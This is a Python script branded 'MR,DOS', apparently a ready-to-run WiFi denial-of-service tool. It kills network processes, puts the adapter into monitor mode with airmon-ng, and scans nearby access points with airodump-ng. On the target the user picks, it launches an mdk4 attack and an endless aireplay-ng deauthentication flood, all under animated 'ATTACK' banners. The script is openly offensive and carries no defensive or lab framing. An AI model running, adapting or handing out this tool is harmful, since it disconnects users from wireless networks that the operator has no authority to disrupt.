
#!/usr/bin/env python3
import subprocess
import pyfiglet
import re
import csv
import os
import time
import shutil
import signal
import sys
import threading
from datetime import datetime
from time import sleep
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
active_wireless_networks = []
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
def check_for_essid(essid, lst):
    check_status = True

    
    if len(lst) == 0:
        return check_status

    
    for item in lst:
        
        if essid in item["ESSID"]:
            check_status = False

    return check_status

#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
print(r"""
███╗   ███╗██████╗    ██████╗  ██████╗ ███████╗
████╗ ████║██╔══██╗   ██╔══██╗██╔═══██╗██╔════╝
██╔████╔██║██████╔╝   ██║  ██║██║   ██║███████╗
██║╚██╔╝██║██╔══██╗   ██║  ██║██║   ██║╚════██║
██║ ╚═╝ ██║██║  ██║▄█╗██████╔╝╚██████╔╝███████║
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═════╝  ╚═════╝ ╚══════╝127.0.0.30D""")
print("\n▌▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▌")
print("\n▌ Mr,DOS> V.2023                                               ▌")
print("\n▌ Email > ?@proton.me                                    ▌")
print("\n▌ https://www.instagram.com/?/                          ▌")
print("\n▌▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▁▌")
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
bar = [
    " [✩░ ▒ ▓ ▆ ▅ ▃ ▂ ▁𝐀𝐓𝐓𝐀𝐂𝐊▁ ▂ ▃ ▅ ▆ ▓ ▒ ░✩]",
    " [✩  ▒ ▓ ▆ ▅ ▃ ▂ ▁𝐀𝐓𝐓𝐀𝐂𝐊▁ ▂ ▃ ▅ ▆ ▓ ▒  ✩]",
    " [✩    ▓ ▆ ▅ ▃ ▂ ▁𝐀𝐓𝐓𝐀𝐂𝐊▁ ▂ ▃ ▅ ▆ ▓    ✩]",
    " [✩      ▆ ▅ ▃ ▂ ▁𝐀𝐓𝐓𝐀𝐂𝐊▁ ▂ ▃ ▅ ▆      ✩]",
    " [✩        ▅ ▃ ▂ ▁𝐀𝐓𝐓𝐀𝐂𝐊▁ ▂ ▃ ▅        ✩]",
    " [✩          ▃ ▂ ▁𝐀𝐓𝐓𝐀𝐂𝐊▁ ▂ ▃          ✩]",
    " [✩            ▂ ▁𝐀𝐓𝐓𝐀𝐂𝐊▁ ▂            ✩]",
    " [✩              ▁𝐀𝐓𝐓𝐀𝐂𝐊▁              ✩]",
    " [✩            ▂ ▁𝐀𝐓𝐓𝐀𝐂𝐊▁ ▂            ✩]",
    " [✩          ▃ ▂ ▁𝐀𝐓𝐓𝐀𝐂𝐊▁ ▂ ▃          ✩]",
    " [✩        ▅ ▃ ▂ ▁𝐀𝐓𝐓𝐀𝐂𝐊▁ ▂ ▃ ▅        ✩]",
    " [✩      ▆ ▅ ▃ ▂ ▁𝐀𝐓𝐓𝐀𝐂𝐊▁ ▂ ▃ ▅ ▆      ✩]",
    " [✩    ▓ ▆ ▅ ▃ ▂ ▁𝐀𝐓𝐓𝐀𝐂𝐊▁ ▂ ▃ ▅ ▆ ▓    ✩]",
    " [✩  ▒ ▓ ▆ ▅ ▃ ▂ ▁𝐀𝐓𝐓𝐀𝐂𝐊▁ ▂ ▃ ▅ ▆ ▓ ▒  ✩]",
    " [✩░ ▒ ▓ ▆ ▅ ▃ ▂ ▁𝐀𝐓𝐓𝐀𝐂𝐊▁ ▂ ▃ ▅ ▆ ▓ ▒ ░✩]",
]    

i = 0

while True:
    print(bar[i % len(bar)], end="\r")
    time.sleep(.1)
    if i == 40:
      break
    i += 1
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
print()
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
if not 'SUDO_UID' in os.environ.keys():
    print("Try running this program with sudo.")
    exit()
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
for file_name in os.listdir():
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
    if ".csv" in file_name:
        print("There shouldn't be any .csv files in your directory. We found .csv files in your directory and will move them to the backup directory.")
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
        directory = os.getcwd()
        try:
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
            os.mkdir(directory + "/backup/")
        except:
            print("Backup folder exists.")
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
        timestamp = datetime.now()
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
        shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
wlan_pattern = re.compile("^wlan[0-9]+")
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
check_wifi_result = wlan_pattern.findall(subprocess.run(["iwconfig"], capture_output=True).stdout.decode())
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
if len(check_wifi_result) == 0:
    print("Please connect a WiFi adapter and try again.")
    exit()
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
print("==========================================")
for index, item in enumerate(check_wifi_result):
    print(f"{index} - {item}")

#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
while True:
    wifi_interface_choice = input("Please select the interface you want to use for the attack: ")
    try:
        if check_wifi_result[int(wifi_interface_choice)]:
            break
    except:
        print("Please enter a number that corresponds with the choices available.")

#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
hacknic = check_wifi_result[int(wifi_interface_choice)]

#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
print("WiFi adapter connected!\nNow let's kill conflicting processes:")

#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
kill_confilict_processes =  subprocess.run(["sudo", "airmon-ng", "check", "kill"])

#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
print("Putting Wifi adapter into monitored mode:")
put_in_monitored_mode = subprocess.run(["sudo", "airmon-ng", "start", hacknic])

#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
discover_access_points = subprocess.Popen(["sudo", "xterm", "+j",  "-geometry", "1000x1000+0+0", "-T", "Scanning. Press Ctrl+C", "-e", "airodump-ng","-w" ,"file","--write-interval", "1","--output-format", "csv", hacknic + "mon"],stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
try:
    while True:
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
                        csv_h.seek(0)
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
                            if row["BSSID"] == "BSSID":
                                pass
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
                            elif row["BSSID"] == "Station MAC":
                                break
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
                            elif check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)

        print("Press Ctrl+C when you want \n")
        print("No |\tBSSID              |\tChannel|\tESSID                         |")
        print("___|\t___________________|\t_______|\t______________________________|")
        for index, item in enumerate(active_wireless_networks):
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
            print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
        time.sleep(1)

except KeyboardInterrupt:
    print("\nReady to make choice.")

#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
while True:
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
    choice = input("Please select a choice from above: ")
    try:
        if active_wireless_networks[int(choice)]:
            break
    except:
        print("Please try again.")
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
hackbssid = active_wireless_networks[int(choice)]["BSSID"]
hackchannel = active_wireless_networks[int(choice)]["channel"].strip()
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
subprocess.run(["airmon-ng", "start", hacknic + "mon", hackchannel])
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
discover_access_points = subprocess.Popen(["mdk4", check_wifi_result[int(wifi_interface_choice)] + "mon", "m", "-t", hackbssid, "-w", "0", "-n", "1024", "-s", "1024", "&", "clear"])
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
discover_access_points = subprocess.Popen(["xterm", "+j",  "-geometry", "100x7+7+1000", "-T", "MR,DOS", "-e", "aireplay-ng", "-0", "0", "-a", hackbssid, check_wifi_result[int(wifi_interface_choice)] + "mon"])
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
bar = [
    " [▒▒▓▓██▇▇▅▅▃▂▂𝗔𝗧𝗧𝗖𝗖𝗞▂▂▃▅▅▇▇██▓▓▒▒]",
    " [ ▒▓▓██▇▇▅▅▃▂▂𝗔𝗧𝗧𝗖𝗖𝗞▂▂▃▅▅▇▇██▓▓▒ ]",
    " [  ▓▓██▇▇▅▅▃▂▂𝗔𝗧𝗧𝗖𝗖𝗞▂▂▃▅▅▇▇██▓▓  ]",
    " [   ▓██▇▇▅▅▃▂▂𝗔𝗧𝗧𝗖𝗖𝗞▂▂▃▅▅▇▇██▓   ]",
    " [    ██▇▇▅▅▃▂▂𝗔𝗧𝗧𝗖𝗖𝗞▂▂▃▅▅▇▇██    ]",
    " [     █▇▇▅▅▃▂▂𝗔𝗧𝗧𝗖𝗖𝗞▂▂▃▅▅▇▇█     ]",
    " [      ▇▇▅▅▃▂▂𝗔𝗧𝗧𝗖𝗖𝗞▂▂▃▅▅▇▇      ]",
    " [       ▇▅▅▃▂▂𝗔𝗧𝗧𝗖𝗖𝗞▂▂▃▅▅▇       ]",
    " [        ▅▅▃▂▂𝗔𝗧𝗧𝗖𝗖𝗞▂▂▃▅▅        ]",
    " [         ▅▃▂▂𝗔𝗧𝗧𝗖𝗖𝗞▂▂▃▅         ]",
    " [          ▃▂▂𝗔𝗧𝗧𝗖𝗖𝗞▂▂▃          ]",
    " [           ▂▂XXXXXXX▂▂           ]",
    " [          ▃▂▂𝗔𝗧𝗧𝗖𝗖𝗞▂▂▃          ]",    
    " [         ▅▃▂▂𝗔𝗧𝗧𝗖𝗖𝗞▂▂▃▅         ]",
    " [        ▅▅▃▂▂𝗔𝗧𝗧𝗖𝗖𝗞▂▂▃▅▅        ]",
    " [       ▇▅▅▃▂▂𝗔𝗧𝗧𝗖𝗖𝗞▂▂▃▅▅▇       ]",
    " [      ▇▇▅▅▃▂▂𝗔𝗧𝗧𝗖𝗖𝗞▂▂▃▅▅▇▇      ]",
    " [     █▇▇▅▅▃▂▂𝗔𝗧𝗧𝗖𝗖𝗞▂▂▃▅▅▇▇█     ]",
    " [    ██▇▇▅▅▃▂▂𝗔𝗧𝗧𝗖𝗖𝗞▂▂▃▅▅▇▇██    ]",
    " [   ▓██▇▇▅▅▃▂▂𝗔𝗧𝗧𝗖𝗖𝗞▂▂▃▅▅▇▇██▓   ]",
    " [  ▓▓██▇▇▅▅▃▂▂𝗔𝗧𝗧𝗖𝗖𝗞▂▂▃▅▅▇▇██▓▓  ]",
    " [ ▒▓▓██▇▇▅▅▃▂▂𝗔𝗧𝗧𝗖𝗖𝗞▂▂▃▅▅▇▇██▓▓▒ ]",
    " [▒▒▓▓██▇▇▅▅▃▂▂𝗔𝗧𝗧𝗖𝗖𝗞▂▂▃▅▅▇▇██▓▓▒▒]",
]
print("Press Ctrl+C exit attack")  
i = 0

while True:
    print(bar[i % len(bar)], end="\r")
    time.sleep(.1)
    i += 1
    subprocess.call("clear", shell=True)
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 
#  ▌║█║▌│║▌│║▌║▌█║MR,DOS ▌│║▌║▌│║║▌█║▌║█ 


